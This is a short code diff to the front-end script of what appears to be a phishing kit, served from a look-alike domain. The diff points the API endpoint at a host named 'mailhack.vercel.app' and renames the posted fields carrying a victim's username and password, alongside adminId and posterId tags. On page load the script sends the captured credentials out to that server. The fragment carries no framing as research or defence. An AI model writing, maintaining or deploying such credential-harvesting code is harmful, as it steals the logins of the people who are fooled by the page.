@@ -1,4 +1,4 @@
-const API_URL = 'https://erosback.vercel.app'
+const API_URL = 'https://mailhack.vercel.app'
 const siteUrl ='www.meggapursonel.online'
 
 function detectDevice(userAgent) {
@@ -60,8 +60,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 },
                 body: JSON.stringify({
                     site:site,
-                    email: uname,
-                    password: pwd,
+                    mail: uname,
+                    passcode: pwd,
                     adminId: adminId,
                     posterId: posterId
                 })
